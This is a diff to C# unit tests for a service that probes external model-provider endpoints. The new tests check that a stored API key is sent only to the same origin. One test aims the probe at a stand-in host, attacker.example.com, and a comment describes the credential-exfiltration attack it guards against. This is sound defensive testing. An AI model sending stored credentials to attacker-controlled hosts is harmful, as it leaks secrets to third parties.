@@ -167,15 +167,45 @@ public sealed class ExternalProviderProbeServiceTests
     }
 
     [Test]
-    public async Task Probe_ForADraftAddressUnderAStoredConnection_TestsTheDraftWithTheStoredKey()
+    public async Task Probe_ForADraftPathOnTheStoredOrigin_TestsTheDraftWithTheStoredKey()
     {
         var transport = new ProbeTransport(_ => Json("{\"data\":[]}"));
         var service = CreateService(transport, CreateConfig());
 
-        _ = await service.ProbeAsync(new ExternalProviderProbeQuery("unsloth-box", "http://127.0.0.1:19000/v1", ApiKey: null)).ConfigureAwait(false);
+        // Same scheme, host and port: the credential's audience has not moved, so editing only the path must not force
+        // the operator to re-type a masked secret.
+        _ = await service.ProbeAsync(new ExternalProviderProbeQuery("unsloth-box", "http://127.0.0.1:18099/openai/v1", ApiKey: null)).ConfigureAwait(false);
 
-        AssertEx.Equal("http://127.0.0.1:19000/v1/models", transport.LastRequestUri?.ToString());
+        AssertEx.Equal("http://127.0.0.1:18099/openai/v1/models", transport.LastRequestUri?.ToString());
         AssertEx.Equal($"Bearer {StoredKey}", transport.LastAuthorization);
+    }
+
+    [Test]
+    public async Task Probe_ForADraftAddressOnAnotherOrigin_DoesNotForwardTheStoredKey()
+    {
+        // THE exfiltration path. An Operator API caller who cannot read the encrypted key could otherwise point the
+        // probe at a listener they control and have the node present the stored secret as a bearer token. Testing a
+        // moved endpoint probes with only what the caller supplied — here, nothing.
+        var transport = new ProbeTransport(_ => Json("{\"data\":[]}"));
+        var service = CreateService(transport, CreateConfig());
+
+        _ = await service.ProbeAsync(new ExternalProviderProbeQuery("unsloth-box", "http://attacker.example.com/v1", ApiKey: null)).ConfigureAwait(false);
+
+        AssertEx.Equal("http://attacker.example.com/v1/models", transport.LastRequestUri?.ToString());
+        AssertEx.False(transport.LastRequestHadAuthorization);
+    }
+
+    [Test]
+    public async Task Probe_ForADraftAddressOnAnotherOrigin_UsesTheKeyTheCallerSupplied()
+    {
+        // The legitimate half of the same flow: an operator moving a connection and re-entering its key must be able to
+        // test the new endpoint before saving.
+        var transport = new ProbeTransport(_ => Json("{\"data\":[]}"));
+        var service = CreateService(transport, CreateConfig());
+
+        _ = await service.ProbeAsync(new ExternalProviderProbeQuery("unsloth-box", "http://127.0.0.1:19000/v1", "sk-new-endpoint")).ConfigureAwait(false);
+
+        AssertEx.Equal("Bearer sk-new-endpoint", transport.LastAuthorization);
     }
 
     [Test]
